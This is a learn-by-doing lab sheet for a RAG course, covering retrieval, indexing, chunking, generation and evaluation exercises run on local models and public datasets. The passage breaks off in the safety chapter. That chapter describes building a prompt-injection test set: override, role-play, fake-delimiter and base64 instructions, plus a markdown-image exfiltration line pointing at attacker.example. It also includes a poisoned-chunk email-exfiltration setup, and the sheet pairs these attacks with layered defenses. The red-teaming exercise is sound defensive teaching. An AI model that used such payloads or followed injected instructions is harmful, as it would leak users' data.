# ai-rag — Labs

A learn-by-doing task sheet for the `ai-rag/` chapters. The chapters hold the theory. This sheet
makes you retrieve it, build it, break it and measure it on a laptop, with public data and local
models. Rules:

- **Closed book first.** Answer each chapter's checkpoint before you reread anything.
- **Predict before you run.** Write the number you expect, then measure it. Keep both.
- **Write results down** with dataset, split, number of queries, `k` and hit rule (README §6: an
  unlabelled number is a rumor).
- **Spaced review.** Redo the checkpoints after 1 day, 1 week and 1 month.

## How to use this sheet

- Order: Setup → 00 (the harness every later number depends on) → Appendix G → 01 → 02 → 03 → 04 →
  Appendix F → 05 → 06 → 07 → 08 → 17 → 20 → 21 → 22 → 24 → 23 → 25. Do Appendices D, E and H while
  the matching chapter is fresh (02, 03/07, 04). Capstones last.
- Tick `- [ ]` boxes. Do every Core task. Do Stretch tasks once the chapter's Core tasks pass.
- Keep `lab-notebook.md`: one entry per task with date, prediction, measured result, the gap, and one
  line on why. Keep per-query rows in DuckDB (`results.duckdb`), not in notebook variables.
- The chapters already have Lab exercise sections, written for your own corpus. This sheet does not
  repeat them. Each chapter below ends with an **Also do** line that points to the ones worth adding.
- Spacing schedule: day 1, day 7, day 30 after finishing a chapter, answer its 3 checkpoint
  questions cold. If you miss one, reread only the cited section, not the chapter.

## Setup

| Environment | Cost | Used by |
|---|---|---|
| Laptop, Python 3.12 venv (`uv`), CPU-only wheels | free | all |
| Docker: Postgres 17 + pgvector (`pgvector/pgvector:pg17`) | free | 03, 21, 25, E, capstones |
| Ollama with `llama3.2:3b` and `qwen2.5:3b` (about 2 GB each, CPU works, a GPU helps) | free | 00, 05–08, 17, 20–25, E, H |
| sentence-transformers: `all-MiniLM-L6-v2`, `BAAI/bge-small-en-v1.5` (both 384-d); cross-encoders `cross-encoder/ms-marco-MiniLM-L-6-v2`, `BAAI/bge-reranker-base` | free | 01–08, F, H |
| BEIR SciFact (5,183 docs, 300 test queries) and FiQA-2018 (57,638 docs, 648 test queries) | free download | 00, 01, 03–05, 08, G |
| The repo golden set, [`labs/golden-set/`](labs/golden-set/README.md) (60 span-labelled questions over these chapters) | in repo | 00, 02, 05–07, F, H |
| Runnable labs: [`labs/document-processing/`](labs/document-processing/README.md), [`labs/llm-resilience/`](labs/llm-resilience/README.md), [`labs/tool-registry/`](labs/tool-registry/README.md) | free, zero deps | 02, D, 23, 24 |
| Hosted LLM API (any provider) | **paid, optional** | tasks marked *(optional, paid)* |

```bash
# 1. Python
uv venv --python 3.12 .venv && source .venv/bin/activate
uv pip install sentence-transformers faiss-cpu hnswlib rank_bm25 PyStemmer ranx duckdb numpy scipy \
  scikit-learn pandas "psycopg[binary]" pgvector pydantic tiktoken ollama httpx fastapi uvicorn \
  langchain-core langchain-classic langchain-community langchain-ollama langchain-huggingface \
  langchain-text-splitters langchain-experimental \
  langgraph langgraph-checkpoint-sqlite langgraph-checkpoint-postgres
# If hnswlib fails to build, use faiss.IndexHNSWFlat for the same tasks.

# 2. Data (queries.jsonl holds every split: keep only query ids that appear in qrels/test.tsv)
mkdir -p data && cd data
for d in scifact fiqa; do
  curl -LO "https://public.ukp.informatik.tu-darmstadt.de/thakur/BEIR/datasets/$d.zip" && unzip -q "$d.zip"
done
cd ..

# 3. Local models
ollama pull llama3.2:3b && ollama pull qwen2.5:3b
```

```yaml
# compose.yaml — shared by every Postgres task. `docker compose up -d`
services:
  pg:
    image: pgvector/pgvector:pg17
    environment: { POSTGRES_PASSWORD: lab, POSTGRES_DB: rag }
    ports: ["5432:5432"]
    volumes: [pgdata:/var/lib/postgresql/data]
    healthcheck: { test: ["CMD-SHELL", "pg_isready -U postgres -d rag"], interval: 5s }
volumes: { pgdata: {} }
# psql postgresql://postgres:lab@localhost:5432/rag -c 'CREATE EXTENSION IF NOT EXISTS vector;'
```

The harness you write in 00.1 and reuse everywhere (signatures only, you write the bodies):

```python
def load_beir(name: str) -> tuple[dict[str, str], dict[str, str], dict[str, dict[str, int]]]:
    """(corpus {doc_id: title + ' ' + text}, test queries {qid: text}, qrels {qid: {doc_id: grade}})"""

def embed(model: str, texts: list[str], prompt: str = "") -> np.ndarray:
    """L2-normalized float32, cached to .npy keyed by (model, prompt, sha256 of texts)."""

def evaluate_run(run: dict[str, dict[str, float]], qrels: dict, metrics=("ndcg@10", "mrr@10", "recall@100")) -> dict: ...

def log_run(con, run_id: str, config: dict, per_query: dict[str, dict[str, float]]) -> None: ...

def paired_bootstrap(a: np.ndarray, b: np.ndarray, iters: int = 10_000, seed: int = 0) -> tuple[float, float, float]:
    """mean(b - a) and its 95% percentile interval, resampling queries with replacement."""
```

---

## 00 — Mental models  ([chapter](00-mental-models.md))
**Time:** ~5 h · **Needs:** Python env, SciFact, golden set, Ollama

- [ ] **00.1 Build the harness and prove it against a published number** *(Level: Core)*
  - **Goal:** a harness you trust before you compare anything with it.
  - **Do:** write the Setup signatures. Use `ranx` (`Qrels.from_dict`, `Run.from_dict`, `evaluate`).
    Run exact search (`scores = Q @ D.T`) with `all-MiniLM-L6-v2` on SciFact test. Log to DuckDB.
  - **Predict:** nDCG@10 within ±0.02 of the SciFact number on the model's MTEB entry.
  - **Verify:** you are within ±0.02. If not, check: queries filtered to the test split, title joined
    to text, vectors normalized. Only then trust the harness.
- [ ] **00.2 Plant each failure class on purpose** *(Level: Core)*
  - **Goal:** see that the four classes of §5 look identical to a user and differ only under §6's
    diagnosis.
  - **Do:** `cd labs/golden-set && python3 build.py --check`. If it reports unresolved quotes, the
    chapters moved under the labels (`08` §3.8): fix those lines in `questions.jsonl`, rebuild, run
    `python3 test_golden_set.py`. The builder globs every `*.md` in `ai-rag/`, this sheet included;
    decide whether to keep it as a distractor and write the choice down. Then take 4 answerable
    questions and force one class each: (a) drop the answer chunk from the index, (b) query with a
    paraphrase that shares no terms with it, (c) retrieve it at rank 8 but pass only the top 3,
    (d) pass it at rank 1 behind 20 distractor chunks with `llama3.2:3b`.
  - **Verify:** 4 wrong answers, and for each, the one measurement that names its class (index
    lookup, recall@50, rank vs cut-off, oracle-context rerun).
- [ ] **00.3 Where the money goes** *(Level: Core)*
  - **Goal:** check mental model 9 (§9) with token counts, not prices from a blog.
  - **Do:** answer 50 golden-set questions with top-5 chunks via Ollama. Record `prompt_eval_count`
    and `eval_count`. Price both at one current published API rate you look up.
  - **Predict:** input tokens' share of total cost.
  - **Verify:** a per-query table and the input share. Recompute with top-10 and state the change.
- [ ] **00.4 Explain it: the ceiling, to a PM** *(Level: Stretch)*
  - **Goal:** 5 sentences, to a product manager who wants a week of prompt work, using your 00.2
    numbers and §4's inequality. No jargon beyond "recall".

**Also do:** §16 exercises 2, 3, 6 and 8 on the golden set.

**Checkpoint (closed book):**
1. Write §4's inequality. If recall at the shipped `k` is 0.6, what is the best end-to-end accuracy?
2. Name the four failure classes.
3. What single test separates retrieval failures from generation failures, and why must it bypass the retriever?
<details><summary>Answers</summary>

1. `P(correct) ≤ P(evidence retrieved) × P(used correctly | retrieved)`. At most 0.6, whatever the prompt does.
2. Not in the corpus; in the corpus but not retrievable; retrieved but ranked out or cut by the context budget; in context but the model misused it.
3. The oracle-context test: feed the known-correct chunk directly. Routing it through the retriever makes it a retrieval test again.
</details>

---

## 01 — Embeddings and representation  ([chapter](01-embeddings-and-representation.md))
**Time:** ~4 h · **Needs:** harness, SciFact, FiQA

- [ ] **01.1 Two models, two datasets, one harness** *(Level: Core)*
  - **Goal:** replace a leaderboard opinion with your own paired comparison (§5.2–§5.4).
  - **Do:** exact search with `all-MiniLM-L6-v2` and `bge-small-en-v1.5` (query prompt
    `"Represent this sentence for searching relevant passages: "`, none on documents) on SciFact and
    FiQA. Record nDCG@10, recall@100, docs/s encode speed.
  - **Predict:** the winner on each dataset and the gap in nDCG points. Does the order flip?
  - **Verify:** a 4-row table plus a paired-bootstrap interval on each per-query nDCG delta. Say
    whether each interval excludes 0.
- [ ] **01.2 Break it: two models in one column** *(Level: Core)*
  - **Goal:** watch §12.2's incompatibility fail silently. Both models are 384-d, so nothing errors.
  - **Do:** index SciFact docs with MiniLM, embed queries with bge-small. Add a random-vector baseline.
  - **Predict:** nDCG@10 for the mixed run.
  - **Verify:** near the random baseline, and no exception. Then store `embedding_model` with the
    vectors (§12.6) and assert it matches the query model in `search()`. The mixed run now raises.
- [ ] **01.3 Break it: silent truncation, priced in quality** *(Level: Core)*
  - **Goal:** turn §8's warning into a curve.
  - **Do:** count tokens per SciFact doc with `model.tokenizer` and report the share over
    `model.max_seq_length`. Re-embed with `model.max_seq_length` set to 64, 128 and 256 (MiniLM).
  - **Predict:** nDCG@10 at each length.
  - **Verify:** a 3-point curve, and confirm `encode()` never warned you.
- [ ] **01.4 Hubness census** *(Level: Stretch)*
  - **Goal:** measure §2.3's hubness instead of reading about it.
  - **Do:** on FiQA, count how often each doc appears in the top-10 over all 648 queries. Report
    the share of top-10 slots held by the top 1% of docs, for both models. Read the top 5 hubs.
  - **Predict:** that share (a uniform spread gives 1%).
  - **Verify:** the share per model and a one-line description of what the hubs have in common.

**Also do:** §16 Labs 1, 2 (bge-small's query prompt on vs off) and 4. For Lab 3 (MRL), use
`nomic-ai/nomic-embed-text-v1.5` with its `search_query: ` / `search_document: ` prefixes.

**Checkpoint (closed book):**
1. Why do cosine, dot product and Euclidean distance rank identically, and when do they stop agreeing?
2. You truncate unit-norm MRL vectors to 256 dims and search by inner product. What breaks, and what fixes it?
3. Why is changing the embedding model a migration and not a config change?
<details><summary>Answers</summary>

1. On L2-normalized vectors `‖q − d‖² = 2 − 2·q·d` and cosine equals the dot product. Without normalization, vector length leaks into the dot product.
2. Truncated vectors have norm below 1, different per vector, so length contaminates the ranking. Re-normalize after truncating (§6.2).
3. Vectors from two models are not comparable, so the whole corpus must be re-embedded into a new index. The cost scales with corpus size (§1, §12).
</details>

---

## 02 — Chunking and document processing  ([chapter](02-chunking-and-document-processing.md))
**Time:** ~5 h · **Needs:** `labs/document-processing` (zero deps), golden set, bge-small

- [ ] **02.1 Run labs/document-processing, then move the gate** *(Level: Core)*
  - **Goal:** see §3.2's "zero chunks, zero errors" and the two error rates of a gate.
  - **Do:** `cd labs/document-processing && python3 run.py corpus parse overlap && python3 test_pipeline.py`.
    Then raise `min_yield` in `parse.py` from 100 to 500 chars/page and rerun `run.py corpus`.
  - **Predict:** before the first run, the overlap multiplier for f = 0.2 and 0.5 and which
    fixtures the gate rejects. Before the second, which healthy fixtures now go to OCR.
  - **Verify:** compare to the output. List the false positives you created.
- [ ] **02.2 Chunk size at fixed `k` vs fixed token budget** *(Level: Core)*
  - **Goal:** reproduce §5.3's confound, then remove it (§11.3).
  - **Do:** from `labs/golden-set`, `chunk_corpus(load_corpus(root), max_chars=m)` for m in
    {450, 900, 1800, 3600}. Embed `embed_text` with bge-small. A question hits if a retrieved chunk
    `any_overlap`s an answer span. Score recall@5, and recall at a 2,000-token budget (take chunks in
    rank order until the budget, counting with the bge tokenizer).
  - **Predict:** the winning size under fixed `k`, and under fixed budget.
  - **Verify:** a 4 × 2 table. If the winner does not change, write that down as the finding.
- [ ] **02.3 The hit rule is part of the number** *(Level: Core)*
  - **Goal:** feel §11.2: one retrieval run, several recalls.
  - **Do:** re-score your best 02.2 run with `span_containment`, and with `union_coverage ≥ 0.8`
    over the top-5.
  - **Predict:** how far each drops below `any_overlap`.
  - **Verify:** three numbers for one run, and one sentence on which you would report for multi-hop.
- [ ] **02.4 A chunker that can't control its size** *(Level: Stretch)*
  - **Goal:** test mental model 14 (§6.4).
  - **Do:** split the golden corpus with LangChain `SemanticChunker` (`langchain_experimental`) and
    with `RecursiveCharacterTextSplitter.from_huggingface_tokenizer(tok, chunk_size=400)`.
  - **Predict:** share of semantic chunks over bge-small's 512-token limit.
  - **Verify:** p50/p95/max tokens per chunk for both, and the over-limit share.

**Also do:** §15 Labs 5 (with its full controls), 6 and 7. The lab executes Labs 1, 3 and 9
(`python3 run.py identity` for 9).

**Checkpoint (closed book):**
1. What does 20% overlap cost in chunks, tokens and bytes, and why?
2. Why can chunk-ID labels not compare two chunkings?
3. What is the free version of contextual retrieval?
<details><summary>Answers</summary>

1. 1.25×: total embedded tokens ≈ `N / (1 − f)`. It applies to the embedding bill and to storage, forever (§5.5).
2. Chunk IDs only exist relative to one chunking. Label character spans in canonical text and state the hit rule (§11.2).
3. Structure-aware splitting with the heading path prepended to each chunk (§6.3).
</details>

---

## 03 — Indexing and vector stores  ([chapter](03-indexing-and-vector-stores.md))
**Time:** ~5 h · **Needs:** FiQA bge-small vectors (from 01.1), hnswlib or FAISS, Postgres + pgvector

- [ ] **03.1 `ef_search` vs recall and latency, and the other recall** *(Level: Core)*
  - **Goal:** find an operating point as latency at fixed recall (§3.1, §3.2).
  - **Do:** exact top-10 with `faiss.IndexFlatIP` is the ground truth. Build hnswlib
    (`space="ip"`, `M=16`, `ef_construction=200`), `set_num_threads(1)`. Sweep `set_ef` over
    {10, 16, 32, 64, 128, 256}. Record ANN recall@10, p50/p99 query latency, and retrieval nDCG@10.
  - **Predict:** the smallest `ef` for ANN recall ≥ 0.95 and ≥ 0.99.
  - **Verify:** the table, and the `ef` at which nDCG@10 stops moving. It usually plateaus before
    ANN recall reaches 1.0 (§1.1: two different recalls).
- [ ] **03.2 Break it: `LIMIT 100` in pgvector** *(Level: Core)*
  - **Goal:** hit §4.2's silent cap.
  - **Do:** `CREATE TABLE doc (id text PRIMARY KEY, emb vector(384), bucket int)`, load FiQA with
    `bucket = floor(random()*100)`, then
    `CREATE INDEX ON doc USING hnsw (emb vector_cosine_ops) WITH (m = 16, ef_construction = 64);`.
    Run `SELECT id FROM doc ORDER BY emb <=> $1 LIMIT 100` with the default `hnsw.ef_search`.
  - **Predict:** the number of rows returned.
  - **Verify:** count rows, confirm the plan is an index scan with `EXPLAIN`, then
    `SET hnsw.ef_search = 200;` and count again.
- [ ] **03.3 Filtered search at 1% selectivity** *(Level: Core)*
  - **Goal:** see §7.1's post-filter failure and two fixes (§7.3).
  - **Do:** 100 queries with `WHERE bucket = 7 ORDER BY emb <=> $1 LIMIT 10`. Build the ground truth
    exactly in numpy over the filtered rows. Run (a) default, (b) `SET hnsw.iterative_scan =
    relaxed_order;` (re-sort the result in an outer query), (c) a partial index `... WHERE bucket = 7`.
  - **Predict:** average rows returned in (a).
  - **Verify:** 3 rows of (avg rows returned, filtered recall@10, p50 ms).
- [ ] **03.4 Memory arithmetic, then halfvec** *(Level: Core)*
  - **Goal:** check §5.1's formula against a real index, then take §6.5's free win.
  - **Do:** predict the HNSW index size with §5.1. Read it with
    `SELECT pg_size_pretty(pg_relation_size('doc_emb_idx'));`. Build
    `USING hnsw ((emb::halfvec(384)) halfvec_cosine_ops)` and query with the same cast.
  - **Verify:** predicted vs actual bytes; halfvec size and its recall@10 against 03.1's truth.
- [ ] **03.5 IVF instead of HNSW** *(Level: Stretch)*
  - **Goal:** §4.5's alternative, on the same axes.
  - **Do:** `faiss.IndexIVFFlat(quantizer, 384, 256, faiss.METRIC_INNER_PRODUCT)`, train, sweep
    `nprobe` in {1, 4, 16, 64}.
  - **Verify:** latency at recall@10 ≥ 0.95 for IVF and HNSW, plus build time for each.

**Also do:** §15 Labs 4 (quantization ladder with rescoring), 5 (all selectivity bands) and 7 (tombstones).

**Checkpoint (closed book):**
1. What is pgvector's default `hnsw.ef_search`, and what happens with `LIMIT 100`?
2. What is the only comparable number between two index configurations?
3. Which HNSW parameters are build-time and which are query-time, and what does that mean for tuning order?
<details><summary>Answers</summary>

1. 40. The index returns at most 40 rows, silently. Keep `ef_search ≥ k` as an asserted invariant (§4.2).
2. Latency at a fixed recall (§3.2).
3. `M` and `ef_construction` are build-time (a rebuild); `ef_search` is query-time and free. Sweep `ef_search` first, rebuild for `M` only after (§4.1).
</details>

---

## 04 — Hybrid retrieval and reranking  ([chapter](04-retrieval-hybrid-and-reranking.md))
**Time:** ~5 h · **Needs:** harness, SciFact (FiQA optional), rank_bm25, cross-encoders

- [ ] **04.1 A BM25 baseline tuned as hard as the challenger** *(Level: Core)*
  - **Goal:** §2.4 and §13.1: the analyzer is the part that matters.
  - **Do:** `BM25Okapi` over (a) `text.split()`, (b) lowercase + `re.findall(r"\w+")` + English
    stopwords + `Stemmer.Stemmer("english")`. Score nDCG@10 and recall@100.
  - **Predict:** the nDCG@10 gain from (a) to (b).
  - **Verify:** 2 rows; the analyzer is recorded in the run config.
- [ ] **04.2 BM25 vs dense vs RRF** *(Level: Core)*
  - **Goal:** measure hybrid instead of assuming it (§3.3, §5.2).
  - **Do:** top-100 from 04.1(b) and bge-small. Write `rrf(runs, k=60)` yourself; cross-check with
    `ranx.fuse(runs=[bm25, dense], method="rrf", params={"k": 60})`. Per query, record whether a
    relevant doc is in BM25-only, dense-only, both or neither top-100.
  - **Predict:** nDCG@10 for each system, and whether RRF beats the best branch.
  - **Verify:** a 3-row table, the 4-way census, and a paired interval for RRF minus the best branch.
- [ ] **04.3 RRF `k` and the rank window** *(Level: Core)*
  - **Goal:** separate §5.2's consensus knob from §5.4's trap.
  - **Do:** sweep `k` in {1, 10, 60, 200} at branch depth 100; then fix `k = 60` and fuse at branch
    depth 10 vs 100.
  - **Predict:** which change moves fused recall@100 more.
  - **Verify:** both tables; name the parameter you would log on every request.
- [ ] **04.4 Reranker lift, and what it cannot move** *(Level: Core)*
  - **Goal:** §7 and §13.2 in numbers.
  - **Do:** `CrossEncoder("cross-encoder/ms-marco-MiniLM-L-6-v2").predict(pairs)` on the RRF top
    20, 50 and 100. Measure nDCG@10, MRR@10, recall@fusion_depth before and after, and CPU ms/query.
  - **Predict:** the nDCG@10 lift at depth 50, and the change in recall@fusion_depth.
  - **Verify:** recall@fusion_depth is identical before and after (if not, you have a bug); a
    depth → lift → ms table, with the knee named.
- [ ] **04.5 Stratify the lift** *(Level: Stretch)*
  - **Goal:** §13.4: the aggregate hides the mechanism.
  - **Do:** split SciFact queries by `re.search(r"\d|[A-Z]{2,}", q)` (numbers, acronyms). Report
    hybrid-over-dense and reranker lift per stratum. Repeat 04.4 with `BAAI/bge-reranker-base`.
  - **Verify:** per-stratum deltas with interval widths, and quality per millisecond for both rerankers.

**Also do:** §17 Labs 2 (candidate-depth sweep), 7 (MMR) and 8 (authorization invariant).

**Checkpoint (closed book):**
1. Write RRF. What does a small `k` do vs `k = 60`?
2. With a reranker downstream, what metric evaluates fusion, and why?
3. Can a cross-encoder be the first stage? Why not?
<details><summary>Answers</summary>

1. `RRF(d) = Σ 1 / (k + rank_q(d))`. Small `k` lets one branch's top hit win; `k = 60` rewards agreement across branches (§5.2).
2. Recall@candidate_depth. The reranker discards the fused order, so fusion's only job is set membership (§5.3).
3. No. It encodes query and document jointly, so nothing can be precomputed or indexed (§1.2).
</details>

---

## 05 — Query understanding  ([chapter](05-query-understanding.md))
**Time:** ~5 h (LLM-bound) · **Needs:** FiQA, bge-small, Ollama `qwen2.5:3b`, golden set

Use a fixed 150-query FiQA sample (`random.Random(0).sample`) to keep CPU generation time sane.

- [ ] **05.1 Strata before techniques** *(Level: Core)*
  - **Goal:** §13.2: know where raw queries fail before manufacturing anything.
  - **Do:** tag each query with a rule: ≤ 5 words, starts with a question word, contains a
    number/ticker. Hand-check 30 tags. Run the dense baseline per stratum.
  - **Predict:** the weakest stratum.
  - **Verify:** nDCG@10 per stratum with n per stratum.
- [ ] **05.2 HyDE, per stratum, with its latency** *(Level: Core)*
  - **Goal:** §7.2–§7.4 measured.
  - **Do:** generate a 100-word hypothetical answer at `temperature 0`; embed it as a document (no
    query prompt). Runs: raw, HyDE, mean of raw and HyDE vectors. Time each LLM call.
  - **Predict:** overall nDCG delta, and the stratum where HyDE hurts.
  - **Verify:** stratum × run table, paired intervals, added p50/p95 ms. Read the 3 worst
    hypotheticals and classify them with §14.5.
- [ ] **05.3 Break it: HyDE on a corpus the model has never seen** *(Level: Core)*
  - **Goal:** §7.4: HyDE needs a reasonable prior over the answer space.
  - **Do:** run raw vs HyDE on the golden-set questions (this book's own terms, like `ef_search`).
  - **Predict:** whether the delta is worse than on FiQA.
  - **Verify:** recall@5 both ways; count hypotheticals that invent terms (§14.3).
- [ ] **05.4 The semantic cache that answers the wrong question** *(Level: Core)*
  - **Goal:** §11.2's danger, as a false-hit rate.
  - **Do:** embed all 648 FiQA test queries. For every pair above a cosine threshold, a "hit" is
    false if the two queries share no relevant doc. Thresholds 0.85, 0.90, 0.95.
  - **Predict:** false-hit share at 0.90.
  - **Verify:** hits and false hits per threshold; 3 false-hit pairs quoted.
- [ ] **05.5 Route instead of always-on** *(Level: Stretch)*
  - **Goal:** §2.5: routing beats any single technique.
  - **Do:** apply HyDE only to the strata where 05.2 showed a gain.
  - **Verify:** overall nDCG and LLM calls per query for raw, always-HyDE and routed.

**Also do:** §17 Labs 4 (multi-query redundancy), 7 (conversational resolution) and 9 (Pareto frontier).

**Checkpoint (closed book):**
1. Which mismatch does each fix: rewriting, step-back, decomposition, HyDE?
2. When does HyDE hurt?
3. Why does the original query always run?
<details><summary>Answers</summary>

1. Vocabulary; abstraction level; complexity (multi-part questions); question-vs-answer perspective.
2. When the LLM's prior over answers is wrong (novel or private domains) or the query is already precise (factual lookups, identifiers).
3. Manufacturing is additive: each manufactured query is an extra branch. A bad branch adds noise the reranker can discard; it never removes the original signal.
</details>

---

## 06 — Context engineering  ([chapter](06-context-engineering.md))
**Time:** ~4 h · **Needs:** Ollama, golden set, `tiktoken`

- [ ] **06.1 Tokenizer mismatch and the template tax** *(Level: Core)*
  - **Goal:** §3.1 and §2.4 on your own models.
  - **Do:** for 50 prompts, compare `tiktoken` `cl100k_base` counts with Ollama's
    `prompt_eval_count` for both models. Send a one-word user message to read the template overhead.
  - **Predict:** mean relative error of `cl100k_base`, and the overhead of a one-word message.
  - **Verify:** mean and max error per model. If a repeated prompt reports a much smaller count,
    that is prefix-cache reuse (§12): put a random nonce on the first line when counting.
- [ ] **06.2 Break it: silent overflow** *(Level: Core)*
  - **Goal:** §16.1: overflow degrades, it does not crash.
  - **Do:** `options={"num_ctx": 2048}`. Build a ~4,000-token prompt with code word A in the first
    chunk and code word B in the last, and ask for both. Then 20 golden-set questions with the gold
    chunk first and distractors after, at `num_ctx` 2048 vs 8192.
  - **Predict:** error or not; which code word survives; accuracy at each size.
  - **Verify:** no exception; the `prompt_eval_count` cap; which end was cut; the two accuracies.
- [ ] **06.3 The metadata tax, in your tokenizer** *(Level: Core)*
  - **Goal:** §2.3 measured.
  - **Do:** wrap the same 10 chunks three ways: `[n]` only, §2.3's source/title/section header,
    and JSON objects. Count with Ollama.
  - **Predict:** overhead tokens per chunk for each.
  - **Verify:** per-chunk overhead, and its share of the context at 200- and 400-token chunks.
- [ ] **06.4 Cache-aware ordering, measured locally** *(Level: Core)*
  - **Goal:** §12.2: static prefix first, variable content last.
  - **Do:** 20 questions against one fixed 3,000-token document block. Layout A: system + document,
    question last. Layout B: question first, then the document. Set `OLLAMA_NUM_PARALLEL=1`.
  - **Predict:** the ratio of mean `prompt_eval_duration` B / A after the first call.
  - **Verify:** both means, and one sentence on what this means for provider prompt caching.
- [ ] **06.5 Extractive compaction** *(Level: Stretch)*
  - **Goal:** §7.2: fewer tokens, same answers?
  - **Do:** keep only sentences a cross-encoder scores above a threshold; answer 30 questions.
  - **Verify:** tokens saved and accuracy change, compared at equal questions.

**Also do:** §19 Labs 2 (lost in the middle), 6 (citation fidelity) and 7 (long-context crossover).

**Checkpoint (closed book):**
1. Write the retrieval budget.
2. What does context overflow look like in production, and what do you alert on?
3. What prompt layout makes prefix caching work?
<details><summary>Answers</summary>

1. Window − (system + history + query + output reservation + safety margin). Retrieval gets the residual, and it shrinks every turn.
2. No error. A plausible answer from less information. Alert on context utilization (for example at 85%).
3. Static content first and byte-identical, variable content (query, retrieved chunks) last.
</details>

---

## 07 — Generation and structured output  ([chapter](07-generation-and-structured-output.md))
**Time:** ~4 h · **Needs:** Ollama, Pydantic v2, golden set

Schema for every task: `Answer(answer: str, citations: list[Citation], abstain: bool)`,
`Citation(chunk_id: str, quote: str)`.

- [ ] **07.1 Three levels of enforcement, three kinds of failure** *(Level: Core)*
  - **Goal:** §3–§6: constrained decoding removes structural failures, not semantic ones.
  - **Do:** 50 golden-set questions, top-5 chunks, `llama3.2:3b`, temperature 0. Runs: (a) "reply in
    JSON" in the prompt, (b) `format="json"`, (c) `format=Answer.model_json_schema()`. For each,
    count JSON parse errors, `ValidationError`s, and semantic errors (cited `chunk_id` not provided,
    `quote` not a verbatim substring of that chunk).
  - **Predict:** each of the 9 cells.
  - **Verify:** the 3 × 3 table.
- [ ] **07.2 Repair vs retry from scratch** *(Level: Core)*
  - **Goal:** §7.3.
  - **Do:** on run (a)'s failures, retry once with the Pydantic error text appended, and once with a
    fresh identical call.
  - **Predict:** which fixes more.
  - **Verify:** fix rate and extra tokens for each.
- [ ] **07.3 Refusal masquerading as compliance** *(Level: Core)*
  - **Goal:** §16.5 and `08` §10.5.
  - **Do:** 20 questions whose answer is not in the corpus. Run schema (c) without `abstain`, then
    with `abstain` and a field description.
  - **Predict:** fabricated-answer rate for each.
  - **Verify:** abstention recall on the 20, and over-refusal rate on 20 answerable ones.
- [ ] **07.4 Determinism** *(Level: Core)*
  - **Goal:** §8.
  - **Do:** 20 prompts × 5 runs at temperature 0 with fixed `seed`, then at 0.8.
  - **Predict:** distinct outputs per prompt at each setting.
  - **Verify:** mean distinct outputs, and how often the cited `chunk_id` set changes.
- [ ] **07.5 Field order steers the model** *(Level: Stretch)*
  - **Goal:** §5.1 and §11.2: the schema is a prompt.
  - **Do:** move `citations` before `answer` in the schema. Re-run 07.1(c).
  - **Verify:** semantic error rate and answer quality before and after.

**Also do:** §19 Labs 6 (streaming with early validation), 8 (property-based tests) and 9 (model version regression).

**Checkpoint (closed book):**
1. The four parts of a structured-output contract?
2. What does constrained decoding guarantee, and what not?
3. Why does output repair beat retrying from scratch?
<details><summary>Answers</summary>

1. Schema, validation, retry, degradation path.
2. Structural validity. Not semantic correctness: valid JSON can cite a chunk that does not support the claim.
3. The model sees the validation error, so it makes a targeted fix instead of a fresh random attempt.
</details>

---

## 08 — Evaluation methodology  ([chapter](08-evaluation-methodology.md))
**Time:** ~5 h (incl. hand labelling) · **Needs:** harness, 01 and 07 outputs, Ollama

- [ ] **08.1 Pairing, measured** *(Level: Core)*
  - **Goal:** §13.1: why a paired test makes a small set usable.
  - **Do:** for 01.1's SciFact comparison, compute a 95% interval for the nDCG delta unpaired
    (resample each system's queries independently) and paired. Then subsample 50 queries 1,000 times
    and count how often each interval excludes 0.
  - **Predict:** paired width as a fraction of unpaired width.
  - **Verify:** both widths, and both detection rates at n = 50.
- [ ] **08.2 LLM-as-judge vs 30 hand labels** *(Level: Core)*
  - **Goal:** §11.1–§11.4: a judge is a classifier. Validate it before trusting it.
  - **Do:** take 30 answers from 07.1, a third of them doubtful. Label pass/fail yourself first,
    blind, and write the rubric down. Judge with `qwen2.5:3b` (not the generator's family, §11.2)
    using your rubric and an `unsure` option. Compute accuracy,
    `sklearn.metrics.cohen_kappa_score`, recall on FAIL, and both label distributions.
  - **Predict:** κ.
  - **Verify:** the report, compared with §11.1's gate (κ ≥ 0.7). Improve the rubric once and
    re-measure. Bootstrap κ over items and note how wide 30 labels leave it.
- [ ] **08.3 Position bias in a pairwise judge** *(Level: Core)*
  - **Goal:** §11.2–§11.3.
  - **Do:** 20 answer pairs judged as (A, B) and again as (B, A).
  - **Predict:** flip rate.
  - **Verify:** flip rate, and the share that always favours position 1.
- [ ] **08.4 The judge's own noise floor** *(Level: Stretch)*
  - **Goal:** §10.8: nondeterminism is structural.
  - **Do:** run the 08.2 judge 5 times at temperature 0 and at 0.7.
  - **Verify:** per-item flip rate and judge-vs-itself κ at each setting. That κ caps any
    judge-vs-human κ.

**Also do:** §19 Labs 1 (span survival), 5 (oracle ablation), 7 (regression gate) and 8 (unanswerable stratum).

**Checkpoint (closed book):**
1. What is the label invariance principle?
2. What κ gates a judge, and why is accuracy not enough?
3. Why pair comparisons?
<details><summary>Answers</summary>

1. A label can compare configurations of stage S only if it is defined independently of S: spans, not chunk IDs (§3.1).
2. κ ≥ 0.7. A judge can score 90% accuracy and never flag the FAIL class; report recall on FAIL (§11.1).
3. Query difficulty is the largest source of variance, and pairing removes it, so the same n gives a narrower interval (§13.1).
</details>

---

## 17 — Safety, guardrails and prompt injection  ([chapter](17-safety-guardrails-and-prompt-injection.md))
**Time:** ~5 h · **Needs:** Ollama, golden set or SciFact abstracts, a mock `send_email` tool

- [ ] **17.1 Build an injection test set and measure attack success rate** *(Level: Core)*
  - **Goal:** a measured ASR, not a feeling (§3.2, §3.4, §5.2, §14.1).
  - **Do:** plant 40 poisoned chunks, 8 per type: direct override, role-play, fake closing delimiter
    (`</context>`), base64-encoded instruction, and markdown-image exfiltration
    (`![x](https://attacker.example/?d=...)`). Each carries its own attacker string. Put a canary
    (§4.4) in the system prompt. Write 40 questions that retrieve the poisoned chunks and 40 benign
    ones. Run your RAG prompt on `llama3.2:3b`.
  - **Predict:** ASR per type.
  - **Verify:** ASR = outputs containing the attacker string, the canary, or an off-allowlist image
    URL, per type as n/N.
- [ ] **17.2 Defenses one at a time, with both error rates** *(Level: Core)*
  - **Goal:** §4.2–§4.4 and mental model 4: every guardrail has two error rates.
  - **Do:** add (a) random-boundary data tagging, (b) an instruction hierarchy in the system prompt,
    (c) a code output filter (canary, attacker strings, image URLs off an allowlist). Re-run 17.1
    after each, cumulatively.
  - **Predict:** which layer cuts ASR most.
  - **Verify:** ASR and benign false-positive rate after each layer.
- [ ] **17.3 Rule of Two, enforced in code** *(Level: Core)*
  - **Goal:** §4.7: a defense that holds after the model is fooled.
  - **Do:** give the model `send_email(to, body)`. Poisoned chunks ask it to mail data to
